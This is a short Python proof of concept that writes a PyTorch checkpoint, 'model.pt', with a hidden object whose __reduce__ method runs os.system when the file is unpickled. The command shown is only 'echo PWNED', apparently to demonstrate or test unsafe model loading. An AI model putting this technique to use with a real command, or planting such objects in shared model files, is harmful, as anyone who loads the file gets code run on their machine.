import os, torch

class Evil:
    def __reduce__(self):
        return (os.system, ("echo PWNED",))

torch.save({"weight": torch.tensor([0.5, 1.5]), "extra": Evil()}, "model.pt")
